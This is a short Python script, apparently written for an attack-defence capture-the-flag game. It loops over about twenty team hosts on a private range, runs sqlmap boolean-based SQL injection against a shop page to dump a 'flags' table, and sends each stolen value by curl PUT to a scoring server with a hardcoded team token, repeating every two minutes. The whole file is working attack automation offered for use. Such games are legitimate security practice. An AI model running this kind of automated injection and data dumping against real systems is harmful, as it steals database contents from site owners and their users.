import subprocess
from time import sleep

    
while True:
    flag=[]
    for i in range(20,0,-1):
        if i==5:
            continue
        try:
            p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
            sleep(5)            
            with open(f"temp_web{i}.txt","r") as f:
                data=[]
                for line in f:
                    data.append(line)
                print("******************************i: ",i,data[-8]) 
                flag.append(data[-8])
        except:
            print("error get flag")
            sleep(5) 


    for line in flag:
        print(line)
        line=line.replace('|','').replace('\n','').strip()
        try:
            if len(line)>0 :
                cmd_query=f"""curl -i -s -k -X PUT -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' """ \
                        f"""-H 'Accept: /' -H 'Connection: close' -H 'X-Team-Token: e5902a784c4ca765' """ \
                        f"""-H 'Content-Length: 36' -H 'Content-Type: application/json' --data-binary """  \
                        f"""'["{line}"]' 'http://10.254.0.253:8080/flags' """
                print(cmd_query)
                p = subprocess.Popen(cmd_query, shell=True)
                sleep(5)
        except:
            print("error curl")
            sleep(5) 
    sleep(120)